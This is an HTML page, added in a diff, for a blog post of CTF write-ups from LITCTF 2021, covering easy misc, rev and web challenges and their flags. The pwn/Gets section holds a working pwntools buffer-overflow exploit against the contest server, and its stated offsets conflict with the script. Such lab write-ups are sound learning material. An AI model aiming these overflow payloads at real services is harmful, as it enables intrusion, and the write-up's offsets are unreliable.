@@ -1,0 +1,490 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>LIT 2021 - pwnland</title><meta name="Description" content="Writeup for the challenges in LITCTF 2021"><meta property="og:url" content="http://localhost:1313/posts/lit-2021/">
+  <meta property="og:site_name" content="pwnland">
+  <meta property="og:title" content="LIT 2021">
+  <meta property="og:description" content="Writeup for the challenges in LITCTF 2021">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2021-07-16T00:00:00+00:00">
+    <meta property="article:modified_time" content="2021-07-18T00:00:00+00:00">
+    <meta property="article:tag" content="Misc">
+    <meta property="article:tag" content="Pwn">
+    <meta property="article:tag" content="Rev">
+    <meta property="article:tag" content="Web">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="LIT 2021">
+  <meta name="twitter:description" content="Writeup for the challenges in LITCTF 2021">
+<meta name="application-name" content="Cyber/CTF Blog">
+<meta name="apple-mobile-web-app-title" content="Cyber/CTF Blog">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/posts/lit-2021/" /><link rel="prev" href="http://localhost:1313/posts/hsctf-2021/" /><link rel="next" href="http://localhost:1313/posts/defcampctf-2022/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "LIT 2021",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/posts\/lit-2021\/"
+        },"genre": "posts","keywords": "misc, pwn, rev, web","wordcount":  1352 ,
+        "url": "http:\/\/localhost:1313\/posts\/lit-2021\/","datePublished": "2021-07-16T00:00:00+00:00","dateModified": "2021-07-18T00:00:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Xenonminer"
+            },"description": "Writeup for the challenges in LITCTF 2021"
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="pwnland">pwn.land</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/aboutme/"> About Me </a><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/projects/"> Projects </a><a class="menu-item" href="/notes/"> Notes </a><a class="menu-item" href="/aboutme/"> About Me </a><a class="menu-item" href="/tags/"> Tags </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="pwnland">pwn.land</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/aboutme/" title="">About Me</a><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/projects/" title="">Projects</a><a class="menu-item" href="/notes/" title="">Notes</a><a class="menu-item" href="/aboutme/" title="">About Me</a><a class="menu-item" href="/tags/" title="">Tags</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">LIT 2021</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://xenonminer.github.io" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Xenonminer</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeups/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Writeups</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2021-07-16">2021-07-16</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1352 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;7 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#misc">Misc</a></li>
+    <li><a href="#pwn">Pwn</a></li>
+    <li><a href="#rev">Rev</a></li>
+    <li><a href="#web">Web</a></li>
+    <li><a href="#writeups">Writeups</a>
+      <ul>
+        <li><a href="#miscintro-to-ctf">misc/Intro-to-CTF</a></li>
+        <li><a href="#solution">Solution</a></li>
+        <li><a href="#miscdiscord-flag">misc/discord-flag</a></li>
+        <li><a href="#solution-1">Solution</a></li>
+        <li><a href="#miscsurvey">misc/Survey</a></li>
+        <li><a href="#solution-2">Solution</a></li>
+        <li><a href="#mischex-to-ascii">misc/Hex-to-ASCII</a></li>
+        <li><a href="#solution-3">Solution</a></li>
+        <li><a href="#miscdots-and-lines">misc/Dots-and-Lines</a></li>
+        <li><a href="#solution-4">Solution</a></li>
+        <li><a href="#miscnever-gonna-give-you-up">misc/Never-Gonna-Give-You-Up</a></li>
+        <li><a href="#solution-5">Solution</a></li>
+        <li><a href="#miscpeanutbutter-jar">misc/Peanutbutter-Jar</a></li>
+        <li><a href="#solution-6">Solution</a></li>
+        <li><a href="#miscsteganography">misc/Steganography</a></li>
+        <li><a href="#solution-7">Solution</a></li>
+        <li><a href="#misccodetiger-orz">misc/CodeTiger-ORZ</a></li>
+        <li><a href="#solution-8">Solution</a></li>
+        <li><a href="#pwngets">pwn/Gets</a></li>
+        <li><a href="#solution-9">Solution</a></li>
+        <li><a href="#revyarn">rev/Yarn</a></li>
+        <li><a href="#solution-10">Solution</a></li>
+        <li><a href="#revevaluation">rev/Evaluation</a></li>
+        <li><a href="#solution-11">Solution</a></li>
+        <li><a href="#weblet-it-go">web/Let-It-Go</a></li>
+        <li><a href="#solution-12">Solution</a></li>
+        <li><a href="#webmy-first-website">web/My-First-Website</a></li>
+        <li><a href="#solution-13">Solution</a></li>
+        <li><a href="#webdizzy">web/dizzy</a></li>
+        <li><a href="#solution-14">Solution</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><ul>
+<li><a href="https://ctftime.org/event/1398" target="_blank" rel="noopener noreffer ">https://ctftime.org/event/1398</a></li>
+<li>Jul 16 to Jul 18</li>
+<li>Played with wackers</li>
+<li>Ranking: 142/476 with 1875 points</li>
+</ul>
+<h1 id="my-solveswriteups">My Solves/Writeups</h1>
+<h2 id="misc">Misc</h2>
+<table>
+  <thead>
+      <tr>
+          <th>Challenge Name</th>
+          <th>Difficulty</th>
+          <th>Points</th>
+          <th>Writeup</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>misc/Intro-to-CTF</td>
+          <td>Easy</td>
+          <td>I forgor</td>
+          <td><a href="#miscintro-to-ctf" rel="">jump</a></td>
+      </tr>
+      <tr>
+          <td>misc/Discord-Flag</td>
+          <td>Easy</td>
+          <td>I forgor</td>
+          <td><a href="#miscdiscord-flag" rel="">jump</a></td>
+      </tr>
+      <tr>
+          <td>misc/Survey</td>
+          <td>Easy</td>
+          <td>I forgor</td>
+          <td><a href="#miscsurvey" rel="">jump</a></td>
+      </tr>
+      <tr>
+          <td>misc/Hex-to-ASCII</td>
+          <td>Easy</td>
+          <td>I forgor</td>
+          <td><a href="#mischex-to-ascii" rel="">jump</a></td>
+      </tr>
+      <tr>
+          <td>misc/Dots-and-Lines</td>
+          <td>Easy</td>
+          <td>I forgor</td>
+          <td><a href="#miscdots-and-lines" rel="">jump</a></td>
+      </tr>
+      <tr>
+          <td>misc/Never-Gonna-Give-You-Up</td>
+          <td>Easy</td>
+          <td>I forgor</td>
+          <td><a href="#miscnever-gonna-give-you-up" rel="">jump</a></td>
+      </tr>
+      <tr>
+          <td>misc/Peanutbutter-Jar</td>
+          <td>Easy</td>
+          <td>I forgor</td>
+          <td><a href="#miscpeanutbutter-jar" rel="">jump</a></td>
+      </tr>
+      <tr>
+          <td>misc/Steganography</td>
+          <td>Easy</td>
+          <td>I forgor</td>
+          <td><a href="#miscsteganography" rel="">jump</a></td>
+      </tr>
+      <tr>
+          <td>misc/CodeTiger-ORZ</td>
+          <td>Medium</td>
+          <td>I forgor</td>
+          <td><a href="#misccodetiger-orz" rel="">jump</a></td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="pwn">Pwn</h2>
+<table>
+  <thead>
+      <tr>
+          <th>Challenge Name</th>
+          <th>Difficulty</th>
+          <th>Points</th>
+          <th>Writeup</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>pwn/Gets</td>
+          <td>Easy</td>
+          <td>I forgor</td>
+          <td><a href="#pwngets" rel="">jump</a></td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="rev">Rev</h2>
+<table>
+  <thead>
+      <tr>
+          <th>Challenge Name</th>
+          <th>Difficulty</th>
+          <th>Points</th>
+          <th>Writeup</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>rev/Yarn</td>
+          <td>Easy</td>
+          <td>I forgor</td>
+          <td><a href="#revyarn" rel="">jump</a></td>
+      </tr>
+      <tr>
+          <td>rev/Evaluation</td>
+          <td>Easy</td>
+          <td>I forgor</td>
+          <td><a href="#revevaluation" rel="">jump</a></td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="web">Web</h2>
+<table>
+  <thead>
+      <tr>
+          <th>Challenge Name</th>
+          <th>Difficulty</th>
+          <th>Points</th>
+          <th>Writeup</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>web/Let-It-Go</td>
+          <td>Easy</td>
+          <td>I forgor</td>
+          <td><a href="#weblet-it-go" rel="">jump</a></td>
+      </tr>
+      <tr>
+          <td>web/My-First-Website</td>
+          <td>Easy</td>
+          <td>I forgor</td>
+          <td><a href="#webmy-first-website" rel="">jump</a></td>
+      </tr>
+      <tr>
+          <td>web/dizzy</td>
+          <td>Easy</td>
+          <td>I forgor</td>
+          <td><a href="#webdizzy" rel="">jump</a></td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="writeups">Writeups</h2>
+<h3 id="miscintro-to-ctf">misc/Intro-to-CTF</h3>
+<p>Welcome to your first CTF Challenge! For this problem, you simply need to read the CTF Resource page and find the flag :D.
+Resource Page: <a href="https://lit.lhsmathcs.org/ctfres" target="_blank" rel="noopener noreffer ">https://lit.lhsmathcs.org/ctfres</a></p>
+<h3 id="solution">Solution</h3>
+<p>Just read the resource page, or not if you just want the flag.
+Flag is at the bottom of the page.</p>
+<p>Flag: <code>flag{h3ll0_w0r1d_y0ur_f1r5t_ctf}</code></p>
+<h3 id="miscdiscord-flag">misc/discord-flag</h3>
+<p>Go to our discord server <a href="https://discord.gg/k6yzFdZ" target="_blank" rel="noopener noreffer ">https://discord.gg/k6yzFdZ</a> for the flag~ We post the latest information and updates there so it&rsquo;s very important.</p>
+<h3 id="solution-1">Solution</h3>
+<p>Join the discord server and the flag is in the announcements channel.</p>
+<p>Flag: <code>flag{L1T_d1sc0rd_0rz}</code></p>
+<h3 id="miscsurvey">misc/Survey</h3>
+<p>Fill out this LIT CTF 2021 Survey form for a free flag :D
+<a href="https://docs.google.com/forms/d/e/1FAIpQLSebUZnmQDl3sDEPS7Y3ZTBVO3JuxFpgWxZc_sSvVMZZZoVGEw/viewform" target="_blank" rel="noopener noreffer ">https://docs.google.com/forms/d/e/1FAIpQLSebUZnmQDl3sDEPS7Y3ZTBVO3JuxFpgWxZc_sSvVMZZZoVGEw/viewform</a></p>
+<h3 id="solution-2">Solution</h3>
+<p>Just fill out the survey and get the flag.</p>
+<p>Flag: <code>flag{th4nk5_f0r_c0m1ng}</code></p>
+<h3 id="mischex-to-ascii">misc/Hex-to-ASCII</h3>
+<p>You received a mysterious hexadecimal number, maybe you should try converting it to ASCII!<code>666c61677b77346273317465355f346e645f7430306c355f3472335f793075725f673030645f667231336e64357d</code></p>
+<h3 id="solution-3">Solution</h3>
+<p>Just search up Hex To ascii on your web browser and input the encoded message to get the flag.</p>
+<p>Flag: <code>flag{w4bs1te5_4nd_t00l5_4r3_y0ur_g00d_fr13nd5}</code></p>
+<h3 id="miscdots-and-lines">misc/Dots-and-Lines</h3>
+<p>Ye old way of delivering messages, might want to slow it down to catch everything… Note: set the spaces as is, do not replace spaces with underscores</p>
+<p>Attachments: <a href="https://drive.google.com/uc?export=download&amp;id=1qP_8qp2gviDJ5HKRWKDdV54V8tPP0LrG" target="_blank" rel="noopener noreffer ">https://drive.google.com/uc?export=download&id=1qP_8qp2gviDJ5HKRWKDdV54V8tPP0LrG</a></p>
+<h3 id="solution-4">Solution</h3>
+<p>Search up Audio Morse Code Decoder and use the first one that shows up <a href="https://morsecode.world/international/decoder/audio-decoder-adaptive.html" target="_blank" rel="noopener noreffer ">https://morsecode.world/international/decoder/audio-decoder-adaptive.html</a>.</p>
+<p>Upload the file into it and get the decoded message which we can format into our flag.</p>
+<p>Flag: <code>flag{M0RSEC0DEISC00L}</code></p>
+<h3 id="miscnever-gonna-give-you-up">misc/Never-Gonna-Give-You-Up</h3>
+<p>They gave a gif and nothing else.</p>
+<h3 id="solution-5">Solution</h3>
+<p>Download that gif by right clicking and pressing save as, or however you would download an image off of your web browser.</p>
+<p>Check different things around the gif with forensics skills like running file to see what file type etc.</p>
+<p>The most suspicious thing though is when you run binwalk, because it shows that the gif is also a zip archive.</p>
+<p>Knowing that, unzip the image and a flag file comes out.</p>
+<p>Flag: <code>flag{y0u_g0t_r1ck_r0lled_h4h4_g3t_r3kt}</code></p>
+<h3 id="miscpeanutbutter-jar">misc/Peanutbutter-Jar</h3>
+<p>We would like to say a huge thank you to Rythm and Eyangch for their massive support. Not only did they write many of the high quality problems, but they also helped us greatly in the process of hosting CTF. They are from the team PeanutButter.jar and are actually hosting their own CTF competition in August. If you haven&rsquo;t already, you should definitely check out their website, <a href="https://pbjar.github.io/" target="_blank" rel="noopener noreffer ">https://pbjar.github.io/</a>.</p>
+<h3 id="solution-6">Solution</h3>
+<p>Going to the website, we can inspect the page.</p>
+<!-- raw HTML omitted -->
+<p>Flag: <code>flag{pbj4r_4lm0st_b3at_r3dpwn_0nc3}</code></p>
+<h3 id="miscsteganography">misc/Steganography</h3>
+<p>Meow Meow Meow~ That cat is not what it seems&hellip;</p>
+<p>Attachments: <a href="https://drive.google.com/uc?export=download&amp;id=1cJi9V6ZHBmyXmMZj_TXcH-ziwwk8Z9U4" target="_blank" rel="noopener noreffer ">https://drive.google.com/uc?export=download&id=1cJi9V6ZHBmyXmMZj_TXcH-ziwwk8Z9U4</a></p>
+<h3 id="solution-7">Solution</h3>
+<p>Go to <a href="https://stegonline.georgeom.net/upload" target="_blank" rel="noopener noreffer ">https://stegonline.georgeom.net/upload</a> and upload the file.</p>
+<p>Play around with the settings and with LSB Half, you will see the flag in the image.</p>
+<p>Flag: <code>flag{5t3g50lv3r_1s_v3ry_n1c3}</code></p>
+<h3 id="misccodetiger-orz">misc/CodeTiger-ORZ</h3>
+<p>CodeTiger ORZ ORZ ORZ</p>
+<p>Attachments: <a href="https://drive.google.com/uc?export=download&amp;id=1nId2n0A2oEnbOfR3F1ySakcSi7qNMFd4" target="_blank" rel="noopener noreffer ">https://drive.google.com/uc?export=download&id=1nId2n0A2oEnbOfR3F1ySakcSi7qNMFd4</a></p>
+<h3 id="solution-8">Solution</h3>
+<p>They give you a video file so the first thing you do is actually watch the video to see if theres anything weird.</p>
+<p>If you watch carefully, a small text pops up for like 0.1 secs on the screen, which is most probably our flag.</p>
+<p>Now you can try to be insane and catch the flag at the exact time but an easier way to do this challenge is to use a video cutter.</p>
+<p>The video frame cutter I used: <a href="https://online-video-cutter.com/" target="_blank" rel="noopener noreffer ">https://online-video-cutter.com/</a></p>
+<p>Upload the file to the site and trim the video to where the green text appears.</p>
+<p>It might be light if you stop it a little too early but it&rsquo;s better than nothing.</p>
+<p>That&rsquo;s our flag!!</p>
+<p>Flag: <code>flag{c0detiger_0rz}</code></p>
+<h3 id="pwngets">pwn/Gets</h3>
+<p>My favorite libc function is gets. I am very confident in its security. Connect with <code>nc gets.litctf.live 1337</code></p>
+<h3 id="solution-9">Solution</h3>
+<p>The title of the challenge already tells us that the challenge is going to be some type of gets buffer overflow.</p>
+<p>First, we take a look at the c source code that they gave us.</p>
+<p>We see that there is a strcmp function first that we need to get past.</p>
+<p>Next, after we pass the strcmp we have to overwrite the debuf variable so it equals 0xdeadbeef.</p>
+<p>Now we have to figure out our payload to meet the requirements.</p>
+<p>First we know that we have to pass the strcmp, which compares our input with the string &ldquo;Yes&rdquo;.</p>
+<p>Now after we pass the strcmp part of the binary, we try to overwrite into the variable by adding many A&rsquo;s.</p>
+<p>After trying to add many A&rsquo;s to our payload, we realize something is wrong.</p>
+<p>We are now not getting past the strcmp and it sends us directly to the bottom.</p>
+<p>Now the way that we can get past the strcmp is to send a null terminator which is \x00.</p>
+<p>Now we have to find the proper offset to overwrite into the flag variable, which is buf.</p>
+<p>Finding the offset was pretty simple. We just had to test A&rsquo;s until we got 1 A into segmentation fault which meant we started overwriting the variable.</p>
+<p>We find that the offset was an extra 48 A&rsquo;s after the &lsquo;Yes&rsquo; and the null terminator, \x00, which in total gives us the offset of 52.</p>
+<p>Now all we have to do is write the variable exactly to 0xdeadbeef.</p>
+<p>We could do this by concatenating \xef\xbe\xad\xde or using pwntools p64(0xdeadbeef).</p>
+<p>So now, we just had to create the program in python with the correct parts.</p>
+<p>The total payload we were sending was <code>r.sendline(b'Yes' + b'\0' + b'A'*36 + p64(0xdeadbeef) + p64(0x7ffff7fb1390))</code></p>
+<p>Exploit:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">exe</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;gets&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">exe</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">conn</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="kc">False</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;gets.litctf.live&#34;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">conn</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Are you starting to understand?&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Yes&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">36</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x7ffff7fb1390</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">main</span><span class="p">()</span></span></span></code></pre></div></div>
+<p>Flag: <code>flag{d0_y0u_g3ts_1t}</code></p>
+<p><code>Note: I am not the best at pwn so I didn't really understand exactly why this worked but I guess that it read the flag memory address as extra bytes because after looking at other writeups, I saw that all we needed to do was pass the offset and overwrite the debug variable to equal 0xdeadbeef.</code></p>
+<h3 id="revyarn">rev/Yarn</h3>
+<p>Cats like yarn &gt;.&lt;</p>
+<p>Attachment: <a href="https://drive.google.com/uc?export=download&amp;id=1O0wQZoof4RTddp8LArIPY8eLG-Bj3yo7" target="_blank" rel="noopener noreffer ">https://drive.google.com/uc?export=download&id=1O0wQZoof4RTddp8LArIPY8eLG-Bj3yo7</a></p>
+<h3 id="solution-10">Solution</h3>
+<p>Run strings on the file and search for the flag.</p>
+<p>Best way to do that is the command: strings yarn | grep flag</p>
+<p>We get our flag!!</p>
+<p>Flag: <code>flag{y4rn_4nd_s1lk_4r3_n1c3_but_str1ngs_1s_wh4t_g0t_th3_fl4g}</code></p>
+<h3 id="revevaluation">rev/Evaluation</h3>
+<p>Here’s an evaluation copy of my flag checker! I hid the flag in the evaluation copy though…</p>
+<h3 id="solution-11">Solution</h3>
+<p>All the evals check from the evals before it. If we delete one eval, we get this:</p>
+<!-- raw HTML omitted -->
+<p>We can then run a solve script that looks like this to get our flag!</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="s2">&#34;x6wpf6vZ|w6sZq5kZv4Zk54q1fvpcg5~bdic&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">i</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">char</span><span class="p">)</span><span class="o">^</span><span class="mi">5</span><span class="p">))</span></span></span></code></pre></div></div>
+<p>Flag: <code>flag{0bfusc4t10n_1s_n0t_v3ry_s3cur3}</code></p>
+<h3 id="weblet-it-go">web/Let-It-Go</h3>
+<p>Sometimes, you just got to let it go~</p>
+<p>Attachments: <a href="http://websites.litctf.live:8080/" target="_blank" rel="noopener noreffer ">http://websites.litctf.live:8080/</a></p>
+<h3 id="solution-12">Solution</h3>
+<p>You can find the flag by inspecting the page with Ctrl + U</p>
+<p>Flag: <code>flag{l00k5_l1k3_y0u_f1n4lly_l3t_1t_g0}</code></p>
+<h3 id="webmy-first-website">web/My-First-Website</h3>
+<p>I just built my first website! I heard there might be a flag on it too</p>
+<p>Attachments: <a href="http://websites.litctf.live/" target="_blank" rel="noopener noreffer ">http://websites.litctf.live/</a></p>
+<h3 id="solution-13">Solution</h3>
+<p>There&rsquo;s three parts to the flag.</p>
+<ol>
+<li>
+<p>The first part of the flag is in the really fast text on the screen, which you can also find by inspecting the page and searching for &ldquo;flag&rdquo;.
+<!-- raw HTML omitted --></p>
+</li>
+<li>
+<p>The second part of the flag is also found by searching for &ldquo;flag&rdquo; in the source code.
+<!-- raw HTML omitted --></p>
+</li>
+<li>
+<p>I found the third part of the flag in the source code, though you could also find it by clicking on the button with &ldquo;AMAZING COLOURS&rdquo;.
+<!-- raw HTML omitted --></p>
+</li>
+</ol>
+<p>Flag: <code>flag{1_l1k3_90s_w3bs1t3s_d351gns}</code></p>
+<h3 id="webdizzy">web/dizzy</h3>
+<p>My head could use a refresh.</p>
+<p>Attachments: <a href="http://dizzy.litctf.live/" target="_blank" rel="noopener noreffer ">http://dizzy.litctf.live/</a></p>
+<h3 id="solution-14">Solution</h3>
+<p>I&rsquo;m not sure exactly how this worked but when you get the interrupted my codetiger orz message, just press back to get back to the main website and you will get redirected to the flag.</p>
+<p>Flag: <code>flag{th1s_is_b4d_pr4ct1c3_app4ar3nt1y}</code></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2021-07-18</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="http://localhost:1313/posts/lit-2021/" data-title="LIT 2021" data-hashtags="misc,pwn,rev,web"><i class="fab fa-x-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Threads" data-sharer="threads" data-url="http://localhost:1313/posts/lit-2021/" data-title="LIT 2021"><i class="fab fa-threads fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://localhost:1313/posts/lit-2021/" data-hashtag="misc"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/posts/lit-2021/" data-title="LIT 2021"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://localhost:1313/posts/lit-2021/" data-title="LIT 2021"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://localhost:1313/posts/lit-2021/" data-title="LIT 2021"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Diaspora" data-sharer="diaspora" data-url="http://localhost:1313/posts/lit-2021/" data-title="LIT 2021" data-description="Writeup for the challenges in LITCTF 2021"><i class="fab fa-diaspora fa-fw" aria-hidden="true"></i></a><a href="https://t.me/share/url?url=http%3a%2f%2flocalhost%3a1313%2fposts%2flit-2021%2f&amp;text=LIT%202021" target="_blank" title="Share on Telegram"><i class="fab fa-telegram fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/misc/">Misc</a>,&nbsp;<a href="/tags/pwn/">Pwn</a>,&nbsp;<a href="/tags/rev/">Rev</a>,&nbsp;<a href="/tags/web/">Web</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
